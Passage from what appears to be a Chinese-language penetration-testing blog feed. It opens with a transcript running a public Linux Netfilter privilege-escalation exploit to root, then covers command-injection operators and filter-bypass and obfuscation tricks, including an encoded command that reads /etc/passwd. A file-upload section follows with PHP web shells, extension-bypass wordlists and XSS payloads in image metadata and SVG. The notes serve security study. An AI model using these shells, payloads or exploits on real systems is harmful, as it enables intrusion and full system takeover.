class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Liuk3r/CVE-2023-32233</span><br><span class="line">$ cd CVE-2023-32233</span><br><span class="line">$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[*] Netfilter UAF exploit</span><br><span class="line"></span><br><span class="line">Using profile:</span><br><span class="line">========</span><br><span class="line">1                   race_set_slab                   # &#123;0,1&#125;</span><br><span class="line">1572                race_set_elem_count             # k</span><br><span class="line">4000                initial_sleep                   # ms</span><br><span class="line">100                 race_lead_sleep                 # ms</span><br><span class="line">600                 race_lag_sleep                  # ms</span><br><span class="line">100                 reuse_sleep                     # ms</span><br><span class="line">39d240              free_percpu                     # hex</span><br><span class="line">2a8b900             modprobe_path                   # hex</span><br><span class="line">23700               nft_counter_destroy             # hex</span><br><span class="line">347a0               nft_counter_ops                 # hex</span><br><span class="line">a                   nft_counter_destroy_call_offset # hex</span><br><span class="line">ffffffff            nft_counter_destroy_call_mask   # hex</span><br><span class="line">e8e58948            nft_counter_destroy_call_check  # hex</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">[*] Checking for available CPUs...</span><br><span class="line">[*] sched_getaffinity() =&gt; 0 2</span><br><span class="line">[*] Reserved CPU 0 for PWN Worker</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 1</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 2</span><br><span class="line">[*] Started cpu_spinning_loop() on CPU 3</span><br><span class="line">[*] Creating &quot;/tmp/modprobe&quot;...</span><br><span class="line">[*] Creating &quot;/tmp/trigger&quot;...</span><br><span class="line">[*] Updating setgroups...</span><br><span class="line">[*] Updating uid_map...</span><br><span class="line">[*] Updating gid_map...</span><br><span class="line">[*] Signaling PWN Worker...</span><br><span class="line">[*] Waiting for PWN Worker...</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">[*] You&#x27;ve Got ROOT:-)</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Privesc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Command Injections</title>
      <link href="/2024/10/16/pentest/web-pentest/Command%20Injections/"/>
      <url>/2024/10/16/pentest/web-pentest/Command%20Injections/</url>
      
        <content type="html"><![CDATA[<p>常见的注入类型：</p><table><thead><tr><th>Injection</th><th>Description</th></tr></thead><tbody><tr><td>OS Command Injection</td><td>当用户输入直接用作操作系统命令的一部分时发生。</td></tr><tr><td>Code Injection</td><td>当用户输入直接位于评估代码的函数内时发生。</td></tr><tr><td>SQL Injection</td><td>当用户输入直接用作 SQL 查询的一部分时发生。</td></tr><tr><td>Cross-Site Scripting&#x2F;HTML Injection</td><td>当网页上显示准确的用户输入时发生。</td></tr><tr><td>…</td><td></td></tr></tbody></table><h1 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h1><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><table><thead><tr><th>Character</th><th>URL-Encoded Character</th><th>Executed Command</th></tr></thead><tbody><tr><td><code>;</code></td><td><code>%3b</code></td><td>两个都</td></tr><tr><td><code>\n</code></td><td><code>%0a</code></td><td>两个都</td></tr><tr><td><code>&amp;</code></td><td><code>%26</code></td><td>两者（第二个输出通常首先显示）</td></tr><tr><td><code>|</code></td><td><code>%7c</code></td><td>两者（仅显示第二个输出）</td></tr><tr><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>两者（仅当第一个成功时）</td></tr><tr><td><code>|</code></td><td><code>%7c%7c</code></td><td>第二（仅当第一失败时）</td></tr><tr><td><code>``</code></td><td><code>%60%60</code></td><td>两者（仅限 Linux）</td></tr><tr><td><code>$()</code></td><td><code>%24%28%29</code></td><td>两者（仅限 Linux）</td></tr></tbody></table><h2 id="Other-Injection"><a href="#Other-Injection" class="headerlink" title="Other Injection"></a>Other Injection</h2><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Operators</strong></th></tr></thead><tbody><tr><td>SQL Injection</td><td><code>&#39;</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> <code>|</code></td></tr><tr><td>XPath Injection</td><td><code>&#39;</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> <code>|</code></td></tr><tr><td>Code Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>$&#123;&#125;</code> <code>#&#123;&#125;</code> <code>%&#123;&#125;</code> <code>^</code></td></tr><tr><td>Directory Traversal&#x2F;File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> <code>|</code></td></tr><tr><td>XQuery Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table><h1 id="Bypassing"><a href="#Bypassing" class="headerlink" title="Bypassing"></a>Bypassing</h1><h2 id="Character-Filters"><a href="#Character-Filters" class="headerlink" title="Character Filters"></a>Character Filters</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export</span><br></pre></td></tr></table></figure><p><code>Space</code></p><table><thead><tr><th>Character</th><th>Description</th></tr></thead><tbody><tr><td><code>%0a</code></td><td>换行符</td></tr><tr><td><code>%09</code></td><td>制表位</td></tr><tr><td><code>$&#123;IFS&#125;</code></td><td>Linux环境变量，默认值是空格和制表符</td></tr><tr><td><code>&#123;ls,-l&#125;</code></td><td>大括号扩展，相当于执行 <code>ls -l</code></td></tr></tbody></table><p><code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $&#123;PATH:0:1&#125;  </span><br><span class="line">  </span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><code>;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $&#123;LS_COLORS:10:1&#125;  </span><br><span class="line">  </span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><code>Others</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 字符映射  </span><br><span class="line">!-&#125; 定义了一个范围，从 ! 到 &#125;（ASCII 33 到 125）  </span><br><span class="line">&quot;-~ 定义了一个范围，从 &quot; 到 ~（ASCII 34 到 126）  </span><br><span class="line">输入为 (ASCII 91)，字符会在范围 !-&#125; 中查找其对应字符  </span><br><span class="line">在范围 &quot;-~ 中，对应的字符可能是反斜杠 \（ASCII 92）  </span><br><span class="line">  </span><br><span class="line">$ echo $(tr &#x27;!-&#125;&#x27; &#x27;&quot;-~&#x27;&lt;&lt;&lt;[)  </span><br><span class="line">  </span><br><span class="line">\</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>查看环境变量<br>&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cmd  </span><br><span class="line">set  </span><br><span class="line">  </span><br><span class="line"># powershell  </span><br><span class="line">Get-ChildItem Env</span><br></pre></td></tr></table></figure><p><code>\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># cmd</span><br><span class="line">C:\&gt; echo %HOMEPATH:~6,-11%  </span><br><span class="line">  </span><br><span class="line">\</span><br><span class="line"></span><br><span class="line"># powershell</span><br><span class="line">PS C:\&gt; $env:HOMEPATH[0]  </span><br><span class="line">  </span><br><span class="line">\</span><br></pre></td></tr></table></figure><h2 id="Command-Filters"><a href="#Command-Filters" class="headerlink" title="Command Filters"></a>Command Filters</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p><code>&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i</span><br></pre></td></tr></table></figure><p><code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure><p><code>\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w\ho\am\i</span><br></pre></td></tr></table></figure><p><code>$@</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># $@ 是一个特殊变量，表示所有传递给脚本或函数的参数。当没有传递任何参数时，$@ 的值为空，因此它不会产生任何影响。  </span><br><span class="line">who$@ami</span><br></pre></td></tr></table></figure><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p><code>&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w&#x27;h&#x27;o&#x27;am&#x27;i</span><br></pre></td></tr></table></figure><p><code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;am&quot;i</span><br></pre></td></tr></table></figure><p><code>^</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who^ami</span><br></pre></td></tr></table></figure><h2 id="Command-Obfuscation"><a href="#Command-Obfuscation" class="headerlink" title="Command Obfuscation"></a>Command Obfuscation</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><p>大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 替换大写  </span><br><span class="line">$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)  </span><br><span class="line">  </span><br><span class="line"># $&#123;a,,&#125;：将变量 a 的所有字母转换为小写  </span><br><span class="line"># $&#123;a^^&#125;：将变量 a 的所有字母转换为大写  </span><br><span class="line">$(a=&quot;WhOaMi&quot;;printf %s &quot;$&#123;a,,&#125;&quot;)</span><br></pre></td></tr></table></figure><p>反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(rev&lt;&lt;&lt;&#x27;imaohw&#x27;)</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># encode  </span><br><span class="line">echo &#x27;whoami&#x27;| base64  </span><br><span class="line">  </span><br><span class="line">bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</span><br></pre></td></tr></table></figure><p>xxd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># encode  </span><br><span class="line">echo &#x27;whoami&#x27;| xxd -p  </span><br><span class="line">  </span><br><span class="line">bash&lt;&lt;&lt;$(xxd -r -p&lt;&lt;&lt;77686f616d690a)</span><br></pre></td></tr></table></figure><h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><p>大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WhOaMi</span><br></pre></td></tr></table></figure><p>反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex &quot;$(&#x27;imaohw&#x27;[-1..-20] -join &#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># encode  </span><br><span class="line">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#x27;whoami&#x27;))  </span><br><span class="line"># or  </span><br><span class="line">echo -n whoami | iconv -f utf-8 -t utf-16le | base64  </span><br><span class="line">  </span><br><span class="line">iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#x27;dwBoAG8AYQBtAGkA&#x27;)))&quot;</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Upload</title>
      <link href="/2024/10/14/pentest/web-pentest/File%20Upload/"/>
      <url>/2024/10/14/pentest/web-pentest/File%20Upload/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h1><p>Php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;  </span><br><span class="line">&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;  </span><br><span class="line">&lt;?=$_GET[0]($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure><h1 id="Bypassing-Filters"><a href="#Bypassing-Filters" class="headerlink" title="Bypassing Filters"></a>Bypassing Filters</h1><h2 id="前端过滤器"><a href="#前端过滤器" class="headerlink" title="前端过滤器"></a>前端过滤器</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;checkFile(this)&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg,.jpeg,.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">File</span>) </span>&#123;  </span><br><span class="line">...SNIP...  </span><br><span class="line">    <span class="keyword">if</span> (extension !== <span class="string">&#x27;jpg&#x27;</span> &amp;&amp; extension !== <span class="string">&#x27;jpeg&#x27;</span> &amp;&amp; extension !== <span class="string">&#x27;png&#x27;</span>) &#123;  </span><br><span class="line">        $(<span class="string">&#x27;#error_message&#x27;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&quot;Only images are allowed!&quot;</span>);  </span><br><span class="line">        File.form.<span class="title function_ invoke__">reset</span>();  </span><br><span class="line">        $(<span class="string">&quot;#submit&quot;</span>).<span class="title function_ invoke__">attr</span>(<span class="string">&quot;disabled&quot;</span>, <span class="literal">true</span>);  </span><br><span class="line">    ...SNIP...  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后端过滤器"><a href="#后端过滤器" class="headerlink" title="后端过滤器"></a>后端过滤器</h2><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><p>SecLists <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-extensions.txt">web-extensions</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;uploadFile&quot;</span>][<span class="string">&quot;name&quot;</span>]);  </span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION);  </span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phps&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$blacklist</span>)) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File type not allowed&quot;</span>;  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="白名单过滤"><a href="#白名单过滤" class="headerlink" title="白名单过滤"></a>白名单过滤</h3><p>SecLists <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-extensions.txt">web-extensions</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);  </span><br><span class="line">  </span><br><span class="line">if (!preg_match(&#x27;^.*\.(jpg|jpeg|png|gif)&#x27;, $fileName)) &#123;  </span><br><span class="line">    echo &quot;Only images are allowed&quot;;  </span><br><span class="line">    die();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器配置错误 <code>Apache2</code> 服务器 <code>/etc/apache2/mods-enabled/php7.4.conf</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Web 服务器确定允许执行哪些文件 PHP 代码的方式，任何匹配扩展名的文件都将被允许执行 PHP 代码。  </span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)&quot;&gt;</span>  </span><br><span class="line">    SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>字符注入 (Character Injection)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;%20&#x27;</span> <span class="string">&#x27;%0a&#x27;</span> <span class="string">&#x27;%00&#x27;</span> <span class="string">&#x27;%0d0a&#x27;</span> <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;.\\&#x27;</span> <span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;…&#x27;</span> <span class="string">&#x27;:&#x27;</span>; <span class="keyword">do</span>  </span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> <span class="string">&#x27;.php&#x27;</span> <span class="string">&#x27;.phps&#x27;</span>; <span class="keyword">do</span>  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell$char<span class="variable">$ext</span>.jpg&quot;</span> &gt;&gt; wordlist.txt  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell$ext<span class="variable">$char</span>.jpg&quot;</span> &gt;&gt; wordlist.txt  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell.jpg$char<span class="variable">$ext</span>&quot;</span> &gt;&gt; wordlist.txt  </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;shell.jpg$ext<span class="variable">$char</span>&quot;</span> &gt;&gt; wordlist.txt  </span><br><span class="line">    <span class="keyword">done</span>  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="类型过滤器"><a href="#类型过滤器" class="headerlink" title="类型过滤器"></a>类型过滤器</h3><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><p>SecLists <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt">web-all-content-types</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>, <span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>))) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Only images are allowed&quot;</span>;  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MIME-Type"><a href="#MIME-Type" class="headerlink" title="MIME-Type"></a>MIME-Type</h4><p><code>Multipurpose Internet Mail Extensions (MIME)</code> 通常是通过检查文件内容的前几个字节来完成的，这些字节包含 <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signature</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>, <span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>))) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Only images are allowed&quot;</span>;  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="其他攻击"><a href="#其他攻击" class="headerlink" title="其他攻击"></a>其他攻击</h1><h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>当 Web 应用程序允许上传<code>HTML</code>文件时。尽管 HTML 文件不允许执行代码（例如 PHP），但仍有可能在其中实现 JavaScript 代码，以对访问上传的 HTML 页面的任何人进行 XSS 或 CSRF 攻击。如果目标看到他们信任的网站的链接，并且该网站容易上传 HTML 文档，则可能诱骗他们访问该链接并在他们的机器上进行攻击。</p><h3 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h3><p>XSS 攻击的另一个示例是 Web 应用程序在图片上传后显示其 Metadata。对于此类 Web 应用程序，可以在接受原始文本的 Metadata 参数之一中包含 XSS 负载，例如<code>Comment</code>或<code>Artist</code>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -Comment=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#x27; HTB.jpg</span><br></pre></td></tr></table></figure><p>参数<code>Comment</code>已更新为 XSS 负载。当显示图像的元数据时，应该会触发 XSS 负载，并且 JavaScript 代码将被执行以进行 XSS 攻击。此外，如果将图像的 MIME 类型更改为<code>text/html</code>，某些 Web 应用程序可能会将其显示为 HTML 文档而不是图像，在这种情况下，即使不直接显示元数据，也会触发 XSS 负载。</p><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p><code>Scalable Vector Graphics (SVG)</code>图像是基于 XML 的，它们描述 2D 矢量图形，浏览器将其渲染为图像。因此，可以修改其 XML 数据以包含 XSS 有效负载。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">&quot;1&quot;</span> <span class="attr">y</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;green&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">origin</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>使用 SVG 图像，还可以包含恶意 XML 数据以泄露 Web 应用程序的源代码以及服务器内的其他内部文档。使用 XML 数据并非 SVG 图像所独有，因为许多类型的文档也使用它，例如 <code>PDF</code>, <code>Word Documents</code>, <code>PowerPoint 